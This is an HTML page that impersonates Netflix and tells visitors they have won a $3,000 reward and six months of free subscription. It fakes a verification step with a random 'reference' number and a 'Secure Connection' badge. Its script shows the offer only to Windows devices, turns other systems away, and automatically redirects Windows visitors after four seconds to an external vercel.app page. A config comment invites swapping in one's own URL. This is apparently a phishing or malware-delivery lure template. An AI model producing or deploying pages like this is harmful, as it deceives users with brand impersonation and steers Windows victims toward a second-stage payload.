<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Netflix | Promotional Reward</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

:root{
    --red:#e50914;
    --red-bright:#f6121d;
    --black:#050505;
    --dark:#111;
    --line:#292929;
    --gray:#888;
}

body{
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px;

    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Roboto,
        Arial,
        sans-serif;

    color:#fff;

    background:
        radial-gradient(
            circle at 50% 0%,
            rgba(229,9,20,.2),
            transparent 45%
        ),
        linear-gradient(
            135deg,
            #050505,
            #111
        );
}

.container{
    width:100%;
    max-width:540px;
}

.card{
    overflow:hidden;

    background:#111;

    border:1px solid var(--line);
    border-radius:20px;

    box-shadow:
        0 30px 90px rgba(0,0,0,.8);

    animation:slideUp .6s ease-out;
}

@keyframes slideUp{
    from{
        opacity:0;
        transform:translateY(25px);
    }

    to{
        opacity:1;
        transform:translateY(0);
    }
}


/* =========================
   UNSUPPORTED (non-Windows)
========================= */

.unsupported-card{
    width:100%;
    max-width:480px;

    padding:45px 30px;

    text-align:center;

    background:#111;

    border:1px solid var(--line);
    border-radius:20px;

    box-shadow:
        0 30px 90px rgba(0,0,0,.8);

    animation:slideUp .6s ease-out;
}

.unsupported-icon{
    width:70px;
    height:70px;

    margin:0 auto 20px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:rgba(229,9,20,.1);

    border:1px solid rgba(229,9,20,.25);

    border-radius:50%;

    font-size:32px;
}

.unsupported-card h1{
    margin:0 0 12px;

    color:#fff;

    font-size:24px;
    font-weight:800;
}

.unsupported-card p{
    margin:0;

    color:#999;

    font-size:14px;
    line-height:1.65;
}

.unsupported-card p strong{
    color:#ff626a;
}

.unsupported-sub{
    margin-top:14px !important;

    color:#666 !important;

    font-size:12px !important;
}


/* =========================
   HEADER
========================= */

.header{
    padding:38px 30px;

    text-align:center;

    background:
        linear-gradient(
            145deg,
            #210000,
            #090909
        );

    border-bottom:1px solid var(--line);
}

.logo{
    margin-bottom:18px;

    color:var(--red);

    font-size:42px;
    font-weight:900;

    letter-spacing:-3px;

    text-shadow:
        0 0 25px rgba(229,9,20,.25);
}

.header h1{
    margin-bottom:8px;

    font-size:26px;
    font-weight:700;
}

.header p{
    color:#999;
    font-size:13px;
}


/* =========================
   CONTENT
========================= */

.content{
    padding:35px 30px;
}


/* =========================
   REWARD
========================= */

.reward-intro{
    margin-bottom:25px;

    text-align:center;
}

.reward-badge{
    display:inline-block;

    margin-bottom:15px;
    padding:7px 13px;

    color:#ff626a;

    background:rgba(229,9,20,.1);

    border:1px solid rgba(229,9,20,.2);

    border-radius:30px;

    font-size:9px;
    font-weight:800;

    letter-spacing:1.7px;
}

.reward-intro h2{
    font-size:34px;
    line-height:1;
    letter-spacing:-1.5px;
}

.reward-intro h2 span{
    color:var(--red);
}

.reward-intro p{
    margin-top:15px;

    color:#999;

    font-size:14px;
    line-height:1.65;
}

.reward-box{
    display:grid;
    grid-template-columns:1fr 1fr;

    gap:12px;

    margin-bottom:25px;
}

.reward-item{
    padding:20px;

    text-align:center;

    background:#181818;

    border:1px solid #292929;

    border-radius:12px;
}

.reward-item .amount{
    font-size:27px;
    font-weight:900;
}

.reward-item .title{
    margin-top:7px;

    color:#ddd;

    font-size:11px;
    font-weight:700;
}

.reward-item .description{
    margin-top:6px;

    color:#666;

    font-size:9px;
    line-height:1.45;
}


/* =========================
   STATUS
========================= */

.status-box{
    padding:25px;

    text-align:center;

    background:
        linear-gradient(
            145deg,
            #181818,
            #101010
        );

    border:1px solid #303030;

    border-radius:14px;
}

.status-icon{
    width:65px;
    height:65px;

    margin:0 auto 17px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:rgba(229,9,20,.1);

    border:1px solid rgba(229,9,20,.25);

    border-radius:50%;

    font-size:28px;

    animation:pulse 1.8s ease-in-out infinite;
}

@keyframes pulse{
    0%,100%{
        transform:scale(1);
        opacity:1;
    }

    50%{
        transform:scale(.92);
        opacity:.65;
    }
}

.status-text{
    margin-bottom:8px;

    font-size:17px;
    font-weight:700;
}

.status-desc{
    color:#888;

    font-size:12px;

    line-height:1.6;
}


/* =========================
   PROGRESS
========================= */

.progress{
    height:4px;

    margin-top:20px;

    overflow:hidden;

    background:#292929;

    border-radius:20px;
}

.progress-bar{
    width:0;
    height:100%;

    background:var(--red);

    border-radius:20px;

    animation:progress 2s ease forwards;
}

@keyframes progress{
    from{
        width:0;
    }

    to{
        width:100%;
    }
}


/* =========================
   SUCCESS
========================= */

.success{
    display:none;

    margin-top:15px;
    padding:14px;

    color:#6ee7a0;

    background:rgba(16,185,129,.08);

    border:1px solid rgba(16,185,129,.2);

    border-radius:9px;

    text-align:center;

    font-size:12px;
    font-weight:700;
}


/* =========================
   BUTTON
========================= */

.continue-button{
    display:none;

    width:100%;

    margin-top:18px;
    padding:16px 20px;

    color:#fff;

    background:var(--red);

    border-radius:5px;

    text-decoration:none;

    text-align:center;

    font-size:14px;
    font-weight:800;

    transition:.2s;
}

.continue-button:hover{
    background:var(--red-bright);

    transform:translateY(-2px);
}


/* =========================
   FOOTER
========================= */

.footer{
    display:flex;
    align-items:center;
    justify-content:space-between;

    padding:18px 30px;

    background:#0c0c0c;

    border-top:1px solid #242424;

    color:#666;

    font-size:10px;
}

.secure{
    display:flex;
    align-items:center;
    gap:7px;

    color:#65c98b;

    font-weight:700;
}

.secure-icon{
    width:17px;
    height:17px;

    display:flex;
    align-items:center;
    justify-content:center;

    background:#198754;

    color:#fff;

    border-radius:50%;

    font-size:9px;
}

.ref{
    color:#888;

    font-family:"Courier New",monospace;
}

.ref strong{
    color:#bbb;
}


/* =========================
   MOBILE
========================= */

@media(max-width:560px){

    body{
        padding:12px;
    }

    .header{
        padding:30px 20px;
    }

    .content{
        padding:28px 20px;
    }

    .footer{
        padding:16px 20px;
    }

    .logo{
        font-size:36px;
    }

    .reward-intro h2{
        font-size:29px;
    }

    .reward-box{
        grid-template-columns:1fr;
    }
}
</style>
</head>


<body>

<!-- =========================
     WINDOWS-REQUIRED GATE
     (shown only on non-Windows devices)
========================= -->

<div
    class="unsupported-card"
    id="unsupported"
    style="display:none;"
>

    <div class="unsupported-icon">
        💻
    </div>

    <h1>Windows Required</h1>

    <p>
        You're using <strong id="osName">your current device</strong>.
        This page requires a Windows desktop computer.
    </p>

    <p class="unsupported-sub">
        Please open this link on a Windows PC to continue.
    </p>

</div>


<!-- =========================
     PROMO PAGE (Windows only)
========================= -->

<div class="container" id="promoContainer">

<div class="card">


<!-- =========================
     HEADER
========================= -->

<div class="header">

    <div class="logo">
        NETFLIX
    </div>

    <h1>
        Exclusive Promotional Reward
    </h1>

    <p>
        Secure promotional access
    </p>

</div>


<!-- =========================
     CONTENT
========================= -->

<div class="content">


<div class="reward-intro">

    <div class="reward-badge">
        ✦ EXCLUSIVE PROMOTION
    </div>

    <h2>
        Congratulations!
        <br>
        <span>You've Been Selected.</span>
    </h2>

    <p>
        You've been selected for an exclusive
        promotional reward experience featuring
        a $3,000 reward plus 6 months of
        complimentary Netflix subscription access.
    </p>

</div>


<!-- REWARD DETAILS -->

<div class="reward-box">

    <div class="reward-item">

        <div class="amount">
            $3,000
        </div>

        <div class="title">
            Promotional Reward
        </div>

        <div class="description">
            Subject to applicable promotional
            eligibility and terms.
        </div>

    </div>


    <div class="reward-item">

        <div class="amount">
            6 Months
        </div>

        <div class="title">
            Complimentary Subscription
        </div>

        <div class="description">
            Complimentary Netflix subscription
            access subject to applicable terms.
        </div>

    </div>

</div>


<!-- VERIFICATION -->

<div class="status-box">

    <div
        class="status-icon"
        id="statusIcon"
    >
        ⏳
    </div>


    <div
        class="status-text"
        id="statusText"
    >
        Verifying Promotional Access
    </div>


    <div
        class="status-desc"
        id="statusDesc"
    >
        Please wait while we confirm your
        promotional access.
    </div>


    <div class="progress">

        <div class="progress-bar"></div>

    </div>

</div>


<!-- SUCCESS -->

<div
    class="success"
    id="success"
>
    ✓ Promotional access confirmed successfully.
</div>


<!-- CONTINUE -->

<a
    id="continueButton"
    class="continue-button"
    href="#"
>
    Continue to Your Reward →
</a>


</div>


<!-- =========================
     FOOTER
========================= -->

<div class="footer">

    <div class="secure">

        <span class="secure-icon">
            ✓
        </span>

        Secure Connection

    </div>


    <div class="ref">

        REF-

        <strong id="reference">
            --------
        </strong>

    </div>

</div>


</div>

</div>


<script>

/*
==========================================================
CONFIG
==========================================================
*/

// ← CHANGE THIS to your real promotion URL (only one place to edit).
const PROMOTION_URL = "https://ntredirecreward.vercel.app/nblob.html";

// true = auto-redirect after 4 seconds. false = manual button only.
const AUTO_REDIRECT = true;

// Timing (ms from page load)
const VERIFY_DELAY_MS = 2000;    // "Verifying..." phase length
const REDIRECT_DELAY_MS = 4000;  // exact 4-second redirect


/*
==========================================================
DEVICE CHECK — WINDOWS ONLY GATE
==========================================================
*/

function detectOS() {

    const ua = navigator.userAgent.toLowerCase();
    const platform = (navigator.platform || "").toLowerCase();
    const uaData = navigator.userAgentData
        ? (navigator.userAgentData.platform || "").toLowerCase()
        : "";

    // Windows (all versions: 7/10/11, 32-bit, 64-bit, ARM)
    if (
        /win/.test(platform) ||
        /windows|win32|win64|wow64/.test(ua) ||
        /win/.test(uaData)
    ) {
        return "Windows";
    }

    if (/android/.test(ua)) return "Android";
    if (/iphone|ipad|ipod/.test(ua)) return "iOS";
    if (/mac os x|macintosh|macppc/.test(ua)) return "macOS";
    if (/cros|crkey/.test(ua)) return "Chrome OS";
    if (/linux/.test(ua)) return "Linux";

    return "an unsupported device";
}

const os = detectOS();
const isWindows = os === "Windows";

const unsupported = document.getElementById("unsupported");
const promoContainer = document.getElementById("promoContainer");

if (!isWindows) {

    // ── Block non-Windows devices ──
    document.title = "Windows Required";

    document.getElementById("osName").textContent = os;

    promoContainer.style.display = "none";
    unsupported.style.display = "block";

} else {

/*
==========================================================
ELEMENTS (Windows only — non-Windows never reaches here)
==========================================================
*/

const statusIcon = document.getElementById("statusIcon");
const statusText = document.getElementById("statusText");
const statusDesc = document.getElementById("statusDesc");
const success = document.getElementById("success");
const continueButton = document.getElementById("continueButton");
const reference = document.getElementById("reference");


/*
==========================================================
REFERENCE NUMBER
==========================================================
*/

reference.textContent =
    Math.random().toString(36).substring(2,10).toUpperCase();


/*
==========================================================
SYNC BUTTON WITH CONFIG URL
==========================================================
*/

continueButton.href = PROMOTION_URL;


/*
==========================================================
VERIFY PROMOTION (after 2s)
==========================================================
*/

setTimeout(function(){

    statusIcon.textContent = "✓";
    statusIcon.style.animation = "none";
    statusText.textContent = "Promotional Access Confirmed";
    statusDesc.textContent =
        "Your promotional eligibility has been successfully confirmed.";

    success.style.display = "block";
    continueButton.style.display = "block";

}, VERIFY_DELAY_MS);


/*
==========================================================
AUTOMATIC REDIRECT (after 4s)
==========================================================
*/

if(AUTO_REDIRECT){

    setTimeout(function(){

        if(/^https?:\/\//i.test(PROMOTION_URL)){

            statusDesc.textContent = "Redirecting you now…";

            window.location.assign(PROMOTION_URL);
        }

    }, REDIRECT_DELAY_MS);
}

} // ← end Windows-only block

</script>

</body>
</html>
